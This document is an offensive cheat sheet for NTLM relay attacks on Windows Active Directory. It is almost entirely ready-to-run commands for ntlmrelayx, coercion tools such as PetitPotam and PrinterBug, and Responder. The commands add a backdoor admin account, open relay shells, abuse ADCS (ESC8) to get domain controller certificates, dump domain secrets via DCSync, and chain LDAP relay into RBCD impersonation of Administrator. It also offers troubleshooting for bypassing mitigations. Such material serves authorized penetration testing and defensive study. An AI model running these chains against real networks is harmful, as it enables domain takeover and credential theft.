# NTLM Relay — Chain Setup, Coercion Methods, Target Selection

---

## Pre-conditions check

```bash
# 1. Find hosts without SMB signing (relay targets)
crackmapexec smb <subnet>/24 --gen-relay-list relay_targets.txt
nmap --script smb2-security-mode -p 445 <subnet>/24 | grep -B5 "signing: disabled"

# 2. Confirm NTLM is accepted (not blocked by EPA/channel binding)
# Windows Server 2019+: some configs require extended protection → test first

# 3. LDAP signing: required on DCs by default on 2022+
# Test: impacket-ntlmrelayx -t ldap://<dc_ip> --no-smb-server ...
```

---

## Setup (attacker host)

```bash
# Disable SMB and HTTP on attacker (prevents Responder from breaking relay)
# Edit /etc/responder/Responder.conf: SMB=Off, HTTP=Off

# Start ntlmrelayx
# Basic — relay to specific host, exec command
impacket-ntlmrelayx -t smb://<relay_target> -smb2support -c "net user backdoor P@ss123! /add"

# Relay to list of targets
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Interactive SMB shell on successful relay
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
# Shell accessible: nc 127.0.0.1 11000

# SOCKS proxy through relayed session
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
# Use: proxychains crackmapexec smb <target> -u '' -p ''

# Relay to LDAP (create computer account, RBCD abuse)
impacket-ntlmrelayx -t ldap://<dc_ip> --no-smb-server --no-wcf-server -smb2support --delegate-access

# Relay to LDAP with --remove-mic (CVE-2019-1040) — required for cross-protocol relay
# SMB→LDAP relay fails MIC validation unless MIC is removed. Use when:
#   - Capturing NTLM auth over SMB (from coercion tools like PrinterBug)
#   - Relaying to LDAP for RBCD/Shadow Credentials/ACL modification
impacket-ntlmrelayx -t ldap://<dc_ip> --remove-mic --delegate-access --escalate-user '<controlled_computer$>' -smb2support

# Relay to LDAP — RBCD on specific machine account (not creating new one)
# Use --escalate-user when you already control a machine account (Pre-2000, compromised, etc.)
impacket-ntlmrelayx -t ldap://<dc_ip> --remove-mic --delegate-access --escalate-user 'EVIL$' -smb2support

# Relay to ADCS HTTP endpoint (ESC8)
impacket-ntlmrelayx -t http://<ADCS-host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

---

## Coercion methods

Trigger NTLM authentication from victim to attacker. Use after ntlmrelayx is running.

```bash
# Coercer — tries all known methods automatically
python3 Coercer.py coerce -u user -p pass -d domain.local -t <victim> -l <attacker_ip>
python3 Coercer.py coerce -u user -H :NTLM -d domain.local -t <victim> -l <attacker_ip>

# Specific methods:
# PetitPotam (MS-EFSRPC) — works on unpatched DCs, doesn't need auth on old versions
python3 PetitPotam.py -u user -p pass -d domain.local <attacker_ip> <dc_ip>

# PrinterBug / SpoolSample (MS-RPRN) — requires authenticated user + Spooler running on target
python3 SpoolSample.py <dc_ip> <attacker_ip>
impacket-rpcdump <dc_ip> | grep -A1 spoolsv   # verify spooler running

# PrinterBug via impacket (built-in module — no external tool needed)
python3 -c "from impacket.dcerpc.v5 import rprn; ..." # or use printerbug.py
# NOTE: PrinterBug often returns RPC_S_INVALID_NET_ADDR (0x6ab) — this does NOT mean failure.
# The error is returned AFTER the Spooler has already sent the NTLM auth to the attacker.
# Always check ntlmrelayx output regardless of coercion tool error codes.

# DFSCoerce (MS-DFSNM) — newer, less detectable
python3 dfscoerce.py -u user -p pass <attacker_ip> <dc_ip>
```

---

## Responder (passive capture)

Wait for NTLM auth from network traffic (NBT-NS/MDNS/LLMNR poisoning). Slower but no active coercion needed.

```bash
# Full capture mode (SMB + HTTP on)
sudo responder -I eth0 -wv

# Capture only — don't relay (use alongside ntlmrelayx with Responder SMB=Off)
sudo responder -I eth0 -A   # analyze mode — log without responding

# Output: /usr/share/responder/logs/
# NTLMv2 hashes: hashcat -m 5600 ntlmv2.txt rockyou.txt
```

Responder and ntlmrelayx conflict on port 445. Run ntlmrelayx for relay; Responder with SMB=Off for capture only.

---

## Relay target selection strategy

| Target type | Relay action | Impact |
|-------------|-------------|--------|
| Workstation without signing | SMB exec | Local admin code execution |
| Server without signing | SMB exec | Server-level access |
| ADCS HTTP endpoint | Certificate request | Domain auth certificate (→ DCSync) |
| LDAP (DC, no channel binding) | Create computer account | RBCD → DA impersonation |
| LDAP + delegate-access | RBCD setup | Impersonate any user to target |

Priority: ADCS relay (ESC8) > LDAP relay > SMB relay.

---

## Post-relay checklist

```bash
# SMB relay success → verify local admin
crackmapexec smb <relay_target> -u backdoor -p 'P@ss123!'

# LDAP relay → created computer account EVIL$
# Use for RBCD: see references/kerberos-attacks.md §RBCD

# ADCS relay → got DC certificate
certipy auth -pfx dc.pfx -domain domain.local -username dc$ -dc-ip <dc_ip>
impacket-secretsdump -k -no-pass domain.local/dc$@<dc_ip>   # DCSync

# Clean up after relay (if authorized engagement requires it)
net user backdoor /delete   # remove added account
```

---

## Complete chain: Machine Coercion → LDAP Relay → RBCD

Full attack flow for gaining impersonation rights on an internal machine using its own relayed credentials.

**Scenario**: Internal machine (TARGET) is not directly exploitable, but you can coerce its NTLM auth (Spooler running, reachable from your position) and you control a machine account (CONTROLLED$) that you want to grant RBCD rights.

**Requirements**:
- SMB signing disabled on TARGET (for receiving NTLM auth)
- Spooler or EFS running on TARGET (coercion vector)
- LDAP signing not enforced on DC (relay destination)
- You control a machine account with known credentials
- TARGET can reach attacker IP on port 445

```bash
# Step 1: Start relay with --remove-mic and RBCD delegation setup
sudo impacket-ntlmrelayx -t ldap://<dc_ip> --remove-mic \
  --delegate-access --escalate-user 'CONTROLLED$' -smb2support

# Step 2: Trigger coercion (PrinterBug example) — from any authenticated context
python3 printerbug.py domain.local/user:pass@<TARGET_IP> <attacker_ip>
# Or: python3 SpoolSample.py <TARGET_IP> <attacker_ip> -u user -p pass -d domain.local
# Or: python3 PetitPotam.py -u user -p pass -d domain.local <attacker_ip> <TARGET_IP>

# Expected relay output:
# "Servers: Authenticating against ldap://<dc_ip> as DOMAIN/TARGET$ SUCCEED"
# "Delegation rights modified successfully! CONTROLLED$ can now impersonate users on TARGET$"

# Step 3: S4U2Proxy to impersonate Administrator on TARGET
impacket-getST -spn CIFS/<TARGET_FQDN> -impersonate administrator \
  domain.local/'CONTROLLED$':'password' -dc-ip <dc_ip>
export KRB5CCNAME=administrator@cifs_<TARGET_FQDN>@DOMAIN.LOCAL.ccache
impacket-wmiexec -k -no-pass domain.local/administrator@<TARGET_FQDN>
```

**Cross-subnet coercion notes**:
- If TARGET is on an internal subnet reachable only through a pivot (VPN, tunnel, compromised host), verify TCP connectivity from TARGET to your listener before assuming relay will work
- Windows machines with "IP forwarding: disabled" in `ipconfig` may still forward packets if routing entries exist — always test empirically
- Use tunneling tools (chisel, socat) to expose port 445 if direct connectivity fails
- Verify with: trigger coercion → check if ntlmrelayx receives connection (even if auth fails initially)

**Troubleshooting**:
- No relay connection → routing issue. Check TARGET can reach attacker:445
- `STATUS_ACCESS_DENIED` from LDAP → LDAP signing enforced. Try relay to LDAPS with `--remove-mic` or find ADCS ESC8 instead
- `--remove-mic` fails → Server 2022+ patches. Fall back to Shadow Credentials (`--shadow-credentials`) or ADCS relay
- RBCD set but S4U fails → clock skew. Use `faketime` or sync clocks
- Coercion tool errors but relay shows no connection → wrong port, firewall, or Spooler not running

